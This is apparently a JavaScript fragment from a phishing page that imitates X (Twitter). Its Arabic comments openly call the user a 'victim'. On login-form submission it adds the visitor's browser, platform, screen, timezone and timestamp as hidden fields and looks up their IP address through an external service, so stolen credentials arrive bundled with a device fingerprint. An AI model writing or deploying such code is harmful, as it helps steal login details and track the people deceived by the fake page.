// جمع بيانات إضافية عن الضحية
document.getElementById('loginForm').addEventListener('submit', function(e) {
    // جمع معلومات المتصاح
    const userAgent = navigator.userAgent;
    const language = navigator.language;
    const platform = navigator.platform;
    const screenResolution = `${screen.width}x${screen.height}`;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    
    // إضافة البيانات المخفية للنموذج
    const hiddenFields = `
        <input type="hidden" name="user_agent" value="${userAgent}">
        <input type="hidden" name="language" value="${language}">
        <input type="hidden" name="platform" value="${platform}">
        <input type="hidden" name="screen_resolution" value="${screenResolution}">
        <input type="hidden" name="timezone" value="${timezone}">
        <input type="hidden" name="ip_address" value="">
        <input type="hidden" name="timestamp" value="${new Date().toISOString()}">
    `;
    
    this.insertAdjacentHTML('beforeend', hiddenFields);
    
    // الحصول على عنوان IP
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            document.querySelector('input[name="ip_address"]').value = data.ip;
        });
});

// محاكاة تحميل الصفحة
window.addEventListener('load', function() {
    console.log('صفحة X (تويتر) جاهزة');
});
